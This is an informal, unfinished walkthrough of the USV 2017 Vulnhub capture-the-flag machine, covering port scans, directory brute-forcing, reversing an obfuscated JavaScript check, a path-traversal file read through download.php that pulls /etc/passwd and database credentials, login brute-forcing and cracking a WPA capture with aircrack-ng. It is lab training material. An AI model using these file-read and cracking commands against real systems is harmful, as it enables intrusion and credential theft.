USV 2017 - CTF Online 2017
Work in progress, walkthrough for USV CTF-2017 found on Vulnhub

https://www.vulnhub.com/entry/usv-2017,219/
The countries that should be tracked for flags are: Croatia, France, Italy, Laos, Phillippines (Actually found as Philippines, but spelled wrong on the Vulnhub page - If grepping output, search for Philippines in your output, not Phillippines)


192.168.1.144   08:00:27:c5:25:00      8     480  PCS Systemtechnik GmbH 

nmap -sC -sV -T5 -p- --open -n -v 192.168.1.144
PORT      STATE SERVICE        VERSION
21/tcp    open  ftp            ProFTPD 1.3.5b
22/tcp    open  ssh            OpenSSH 7.4p1 Debian 10+deb9u1 (protocol 2.0)
| ssh-hostkey: 
|   2048 d7:10:72:d8:d2:76:b2:1e:28:11:04:11:b4:e2:98:4e (RSA)
|   256 b8:29:61:bb:f1:8c:c4:64:dd:f5:0e:a0:a2:2f:fd:aa (ECDSA)
|_  256 2b:7e:35:10:42:ca:08:20:66:41:88:80:a0:4f:02:e6 (EdDSA)
80/tcp    open  http           Apache httpd
| http-methods: 
|_  Supported Methods: POST OPTIONS HEAD GET
|_http-server-header: Apache
|_http-title: Site doesn't have a title (text/html).
4369/tcp  open  epmd           Erlang Port Mapper Daemon
| epmd-info: 
|   epmd_port: 4369
|   nodes: 
|_    ejabberd: 41049
5222/tcp  open  jabber         ejabberd (Protocol 1.0)
| xmpp-info: 
|   STARTTLS Failed
|   info: 
|     capabilities: 
| 
|     errors: 
|       host-unknown
|       host-unknown
|       (timeout)
|     unknown: 
| 
|     auth_mechanisms: 
| 
|     xmpp: 
|       lang: en
|       server name: localhost
|       version: 1.0
|     stream_id: 8522388095537847638
|     compression_methods: 
| 
|_    features: 
5269/tcp  open  jabber         ejabberd
| xmpp-info: 
|   Ignores server name
|   info: 
|     xmpp: 
|       version: 1.0
|     capabilities: 
| 
|   pre_tls: 
|     xmpp: 
| 
|     capabilities: 
| 
|     features: 
|       TLS
|   post_tls: 
|     xmpp: 
| 
|_    capabilities: 
5280/tcp  open  ssl/xmpp-bosh?
E = root@debian.stl.int
CN = ejabberd
OU = debian
O = stl.int
| ssl-cert: Subject: commonName=ejabberd/organizationName=stl.int
| Issuer: commonName=ejabberd/organizationName=stl.int
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2017-10-23T20:50:49
| Not valid after:  2018-10-23T20:50:49
| MD5:   b564 b144 735b 82ab 84e6 f92a a3b6 25f9
|_SHA-1: c70c cbd1 d530 5c3e 9e8b c87a 9b05 1820 9afb 5222
|_ssl-date: TLS randomness does not represent time
15020/tcp open  ssl/http       Apache httpd
| http-methods: 
|_  Supported Methods: POST OPTIONS HEAD GET
|_http-server-header: Apache
|_http-title: Site doesn't have a title (text/html).
| ssl-cert: Subject: commonName=a51f0eda836e4461c3316a2ec9dad743/organizationName=CTF/stateOrProvinceName=Paris/countryName=FR
| Issuer: commonName=a51f0eda836e4461c3316a2ec9dad743/organizationName=CTF/stateOrProvinceName=Paris/countryName=FR
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2017-10-16T19:54:30
| Not valid after:  2018-10-16T19:54:30
| MD5:   75d6 88d6 d22b 4f51 b66d 28d0 976a 3bfa
|_SHA-1: 391b 4c37 a782 0681 dc8c 4156 cedc b7bd 7a79 c088
|_ssl-date: TLS randomness does not represent time
41049/tcp open  unknown
MAC Address: 08:00:27:C5:25:00 (Oracle VirtualBox virtual NIC)
Service Info: Host: localhost; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Flag 1
Right off the bat, we got a flag for France with MD5 hash of a51f0eda836e4461c3316a2ec9dad743. 

a51f0eda836e4461c3316a2ec9dad743:masamare
You can also see that in the SSL certificate which is self signed, the country of origin is France. While this doesn't equate to an MD5 hash of France, I'm going to assume they go together as the next flag:

Flag 1 - France:a51f0eda836e4461c3316a2ec9dad743

potential password "masamare" to be used elsewhere, but we'll see. Using language tools to reverse, seems like 2 words, "masă mare" from Romanian, which google tells me means "big table".

gobuster -u http://192.168.1.144/ -e -f -x jpg,png,gif,txt,htm,html,php,css,js,conf,md -t 30 -w /usr/share/wordlists/dirb/common.txt

=====================================================
http://192.168.1.144/404.jpg (Status: 200)
http://192.168.1.144/admin2/ (Status: 200)
http://192.168.1.144/index.html (Status: 200)
=====================================================

http://192.168.1.144/admin2/index.html contains a form that uses javascript to validate it. I don't know if I did this right, but I reversed the steps from the if statement until I got a string 777796734469. 

if(_0xb252x4 == 1079950212331060)

console.log(_0xeb5f)
0 value,
1 passinp,
2 password,
3 forms,
4 color,
5 style,
6 valid,
7 getElementById,
8 green,
9 innerHTML,
10 Italy:,
11 red,
12 Incorrect!

var _0xeb5f=["value","passinp","password","forms","color","style","valid","getElementById","green","innerHTML","Italy:","red","Incorrect"];
function validate(){
//var _0xb252x2=123211;
//var _0xb252x3=3422543454;
//_0xb252x2-= 2404; // 120807
var _0xb252x2 = "120807";
//_0xb252x3+= 2980097; //3425523551
var _0xb252x3 = "3425523551";

//var _0xb252x4=document[_0xeb5f[3]][_0xeb5f[2]][_0xeb5f[1]][_0xeb5f[0]]; formspasswordpassinpvalue
var _0xb252x5=md5(_0xb252x4);
_0xb252x4+= 4469;
_0xb252x4-= 234562221224;
//_0xb252x4*= 1988; // 1079950212331060 / 1988 = 543234513245
//var _0xb252x4 = "543234513245"; 543234513245+234562221224
echo 543234513245+234562221224 | bc
777796734469


This did not work. One of the variables is 4469 though and matches partial to our math problem, and when I removed this and used 77779673 everything worked. I dunno. My math may be fuzzy, as I thought surely I needed to subtract this from the total, or it just wasn't calculated how I thought it was. You can copy and paste the following in the browsers javascript console to output the same results though.


var _0xeb5f=["value","passinp","password","forms","color","style","valid","getElementById","green","innerHTML","Italy:","red","Incorrect"];function validate(){var _0xb252x2=123211;var _0xb252x3=3422543454;var _0xb252x4="77779673";var _0xb252x5=md5(_0xb252x4);_0xb252x4+= 4469;_0xb252x4-= 234562221224;_0xb252x4*= 1988;_0xb252x2-= 2404;_0xb252x3+= 2980097;if(_0xb252x4== 1079950212331060){document[_0xeb5f[7]](_0xeb5f[6])[_0xeb5f[5]][_0xeb5f[4]]= _0xeb5f[8];document[_0xeb5f[7]](_0xeb5f[6])[_0xeb5f[9]]= _0xeb5f[10]+ _0xb252x5}else {document[_0xeb5f[7]](_0xeb5f[6])[_0xeb5f[5]][_0xeb5f[4]]= _0xeb5f[11];document[_0xeb5f[7]](_0xeb5f[6])[_0xeb5f[9]]= _0xeb5f[12]};return false}validate()

You'll see the output in green on the page 
Flag 2 - Italy:46202df2ae6c46db8efc0af148370a78


ftp 192.168.1.144
Connected to 192.168.1.144.
220 ProFTPD 1.3.5b Server (Debian) [::ffff:192.168.1.144]

no anyonymous login allowed, but lets take a look at that FTP server.

searchsploit ProFTPD 1.3.5
----------------------------------------------------------------------------------------------- ----------------------------------
 Exploit Title                                                                                 |  Path
                                                                                               | (/usr/share/exploitdb/)
----------------------------------------------------------------------------------------------- ----------------------------------
ProFTPd 1.3.5 - 'mod_copy' Command Execution (Metasploit)                                      | exploits/linux/remote/37262.rb
ProFTPd 1.3.5 - 'mod_copy' Remote Command Execution                                            | exploits/linux/remote/36803.py
ProFTPd 1.3.5 - File Copy                                                                      | exploits/linux/remote/36742.txt
----------------------------------------------------------------------------------------------- ----------------------------------

System is not vulnerable to any of these attacks above. Moving on for now.

https://192.168.1.144:5280/

gobuster -u https://192.168.1.144:5280/ -f -e -x jpg,png,gif,txt,htm,html,php,css,js,conf,md -t 30 -w /usr/share/wordlists/dirb/common.txt


gobuster -u https://192.168.1.144:15020/ -f -e -x jpg,png,gif,txt,htm,html,php,css,js,conf,md -t 30 -w /usr/share/wordlists/dirb/common.txt
=====================================================
https://192.168.1.144:15020/blog/ (Status: 200)
https://192.168.1.144:15020/index.html (Status: 200)
https://192.168.1.144:15020/vault/ (Status: 200)
=====================================================

https://192.168.1.144:15020/blog/admin/login.php
=====================================================
https://192.168.1.144:15020/blog/admin/ (Status: 302)
https://192.168.1.144:15020/blog/classes/ (Status: 200)
https://192.168.1.144:15020/blog/css/ (Status: 200)
https://192.168.1.144:15020/blog/download.php (Status: 200)
https://192.168.1.144:15020/blog/footer.php (Status: 200)
https://192.168.1.144:15020/blog/header.php (Status: 200)
https://192.168.1.144:15020/blog/images/ (Status: 200)
https://192.168.1.144:15020/blog/index.php/ (Status: 200)
https://192.168.1.144:15020/blog/index.php (Status: 200)
=====================================================


=====================================================
https://192.168.1.144:15020/blog/classes/auth.php (Status: 302)
https://192.168.1.144:15020/blog/classes/comment.php (Status: 200)
https://192.168.1.144:15020/blog/classes/index.php/ (Status: 200)
https://192.168.1.144:15020/blog/classes/index.php (Status: 200)
https://192.168.1.144:15020/blog/classes/post.php (Status: 200)
https://192.168.1.144:15020/blog/classes/securimage/ (Status: 200)
https://192.168.1.144:15020/blog/classes/user.php (Status: 200)
=====================================================

=====================================================
https://192.168.1.144:15020/blog/admin/del.php (Status: 302)
https://192.168.1.144:15020/blog/admin/edit.php (Status: 302)
https://192.168.1.144:15020/blog/admin/footer.php (Status: 200)
https://192.168.1.144:15020/blog/admin/header.php (Status: 200)
https://192.168.1.144:15020/blog/admin/index.php/ (Status: 302)
https://192.168.1.144:15020/blog/admin/index.php (Status: 302)
https://192.168.1.144:15020/blog/admin/login.php (Status: 200)
https://192.168.1.144:15020/blog/admin/logout.php (Status: 302)
https://192.168.1.144:15020/blog/admin/new.php (Status: 302)
https://192.168.1.144:15020/blog/admin/uploads/ (Status: 200)
=====================================================

/blog/download.php seems interesting

so download.php, I kept playing with paramters on the URL, using get and manipulations in the address bar. I did this way too long before I realized, it wanted a POST. In creating a form for POST, I was able to pull the /etc/passwd file down with the following example:

<form method="post" action="https://192.168.1.144:15020/blog/download.php">
<input type="text" name="image" value="/etc/passwd" />
<input type="submit" value="Submit" />
</form>

Now that I can read files, I can start work on inspecting readable files from the system.

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false
systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false
systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false
systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false
_apt:x:104:65534::/nonexistent:/bin/false
messagebus:x:105:109::/var/run/dbus:/bin/false
sshd:x:106:65534::/run/sshd:/usr/sbin/nologin
teo:x:1000:1000:teo,,,:/home/teo:/bin/bash
mysql:x:107:111:MySQL Server,,,:/nonexistent:/bin/false
proftpd:x:108:65534::/run/proftpd:/bin/false
ftp:x:109:65534::/srv/ftp:/bin/false
kevin:x:1001:1001::/home/kevin:
epmd:x:110:113::/var/run/epmd:/bin/false
ejabberd:x:111:114::/var/lib/ejabberd:/bin/sh
oana:x:1002:1002::/home/oana:

teo
kevin
ejabberd
oana


curl -k -X POST https://192.168.1.144:15020/blog/download.php --data "image=../blog/classes/db.php"
<?php

    $lnk = mysql_connect("localhost", "mini", "password000");
    $db = mysql_select_db('blog', $lnk);

?>

curl -k -X POST https://192.168.1.144:15020/blog/download.php --data "image=../blog/admin/index.php"
/blog/admin/index.php 
Flag 3 - found as Philippines: 551d3350f100afc6fac0e4b48d44d380

Philippines:551d3350f100afc6fac0e4b48d44d380

curl -k -X POST https://192.168.1.144:15020/blog/download.php --data "image=/etc/hosts"
127.0.0.1       localhost
127.0.1.1       debian.stl.int  debian

Found an http server for ejabber,but I don't know of nor found anything of use here.
192.168.1.144	debian.stl.int
https://debian.stl.int:5280/http-bind
https://debian.stl.int:5280/admin



curl -k -X POST https://192.168.1.144:15020/blog/download.php --data "image=/etc/default/ejabberd"
service ejabberdctl.cfg > file found

Unfortunately EJABBERD_CONFIG_PATH=/etc/ejabberd/ejabberd.yml is not readable by all users.
If we can figure out if they have any mods enabled and the name, we may be able to read them from

/etc/ejabberd/modules.d/

curl -k -X POST https://192.168.1.144:15020/blog/download.php --data "image=/run/ejabberd/ejabberd.pid"
423
We now know the process number it runs under, 

curl -k -X POST https://192.168.1.144:15020/blog/download.php --data "image=/etc/apache2/sites-available/default-ssl.conf"
<IfModule mod_ssl.c>
  <VirtualHost _default_:15020>
     ServerAdmin webmaster@localhost

     DocumentRoot /var/www/ssl

/var/www/ssl/


curl -k -X POST https://192.168.1.144:15020/blog/download.php --data "image=/etc/proftpd/proftpd.conf"
Looks like only user "proftpd" is allowed and no anonymous ftp.


Hint: https://192.168.1.144:15020/blog/post.php?id=3
"I keep a flag.txt in my house"
curl -k -X POST https://192.168.1.144:15020/blog/download.php --data "image=/home/kevin/flag.txt"

flag 4:
Croatia: e4d49769b40647eddda2fe3041b9564c


curl -k -X POST https://192.168.1.144:15020/blog/download.php --data "image=../blog/classes/user.php"


gobuster -u https://192.168.1.144:15020/blog/classes/securimage/ -f -e -x cfg,yaml,jpg,png,gif,txt,htm,html,php,css,js,conf,md -t 30 -w /usr/share/wordlists/dirb/common.txt

=====================================================
https://192.168.1.144:15020/blog/classes/securimage/audio/ (Status: 200)
https://192.168.1.144:15020/blog/classes/securimage/backgrounds/ (Status: 200)
https://192.168.1.144:15020/blog/classes/securimage/captcha.html (Status: 200)
https://192.168.1.144:15020/blog/classes/securimage/database/ (Status: 200)
https://192.168.1.144:15020/blog/classes/securimage/examples/ (Status: 200)
https://192.168.1.144:15020/blog/classes/securimage/images/ (Status: 200)
https://192.168.1.144:15020/blog/classes/securimage/index.php/ (Status: 200)
https://192.168.1.144:15020/blog/classes/securimage/index.html (Status: 200)
https://192.168.1.144:15020/blog/classes/securimage/index.php (Status: 200)
https://192.168.1.144:15020/blog/classes/securimage/LICENSE.txt (Status: 200)
https://192.168.1.144:15020/blog/classes/securimage/README.txt (Status: 200)
https://192.168.1.144:15020/blog/classes/securimage/README.md (Status: 200)
https://192.168.1.144:15020/blog/classes/securimage/securimage.php (Status: 200)
https://192.168.1.144:15020/blog/classes/securimage/securimage.css (Status: 200)
https://192.168.1.144:15020/blog/classes/securimage/securimage.js (Status: 200)
=====================================================



https://192.168.1.144:15020/blog/classes/securimage/example_form.php
https://192.168.1.144:15020/blog/classes/securimage/captcha.html

curl -k -X POST https://192.168.1.144:15020/blog/download.php --data "image=../blog/classes/securimage/database/securimage.sq3"

gobuster -u https://192.168.1.144:15020/blog/classes/securimage/database/ -f -e -x cfg,yaml,jpg,png,gif,txt,htm,html,php,css,js,conf,md -t 30 -w /usr/share/wordlists/dirb/common.txt


apparently https://192.168.1.144:15020/blog/classes/securimage/example_form.php is vulnerable to user agent injection via PHP. However, not sure how to utilize as it seems it emails output, but debug turns off emails so this may have just been a rabit hole of no use.


curl -k -X POST https://192.168.1.144:15020/blog/download.php --data "image=../blog/classes/securimage/example_form.ajax.php"


$lnk = mysql_connect("localhost", "mini", "password000");
$db = mysql_select_db('blog', $lnk);

curl -k -X POST https://192.168.1.144:15020/blog/download.php --data "image=/etc/php/7.0/apache2/php.ini" > php.ini.txt


curl -k -X POST https://192.168.1.144:15020/blog/download.php --data "image=/blog/classes/securimage/securimage_show.php"

we haven't had any luck logging into this machine yet. While we seem to have some passwords from the PHP source files for the database and such, we can't seem to login to the admin panel, which by the looks of it, only gave us the Philippines flag from:
curl -k -X POST https://192.168.1.144:15020/blog/download.php --data "image=../blog/admin/index.php"

I created a password list based on our themed topic, minions.

grep minion /usr/share/wordlists/rockyou.txt > minions

Tried hydra for the FTP and SSH logins. This seemed fruitless, no success. :(


I tried spidering /vault/ but seems to go in a loop(I could be wrong)

mkdir wget-dump
cd wget-dump
wget --no-check-certificate -r -b https://192.168.1.144:15020/vault/
Output will be written to `wget-log'.

find -type f | grep --invert-match htm
/wget-log
./192.168.1.144:15020/minions.jpg
./192.168.1.144:15020/vault/Door222/Vault70/ctf.cap
./192.168.1.144:15020/vault/Door223/Vault1/rockyou.zip
./192.168.1.144:15020/icons/blank.gif
./192.168.1.144:15020/icons/back.gif
./192.168.1.144:15020/icons/folder.gif
./192.168.1.144:15020/icons/compressed.gif
./192.168.1.144:15020/icons/unknown.gif
cd ..
wm -rf wget-dump

So we found some new files.

Our password list we created earlier, came in handy.

aircrack-ng -w ./minions *.cap

                             Aircrack-ng 1.2 rc4

      [00:00:00] 28/67 keys tested (1198.58 k/s) 

      Time left: 0 seconds                                      41.79%

                          KEY FOUND! [ minion.666 ]


      Master Key     : CA 8E A6 F3 BB 7F 29 CD D9 F8 91 43 CC 26 2D B6 
                       8C 1A 05 1A 39 67 94 5A 60 81 E6 6F FF 91 0F 28 

      Transient Key  : 9E DD C0 66 D0 3B 99 A5 9F 41 D6 F9 40 95 55 04 
                       B1 87 ED 42 24 1A A2 6C B3 C5 36 D2 62 46 AB 28 
                       92 D6 09 8D B8 69 23 C7 EB 2E 01 0E CB BB 40 36 
                       6F 11 68 CC 99 80 DF 36 FC 8D 8A 48 50 88 F9 C1 

      EAPOL HMAC     : FB C1 48 13 17 D1 EA 23 FE CF 93 52 97 0B 83 4A 

Later found that the blog password, was minion.666 for user admin, but we already got the flag for this via the download.php route.


The only flag we're missing at this point, is the Laos flag.
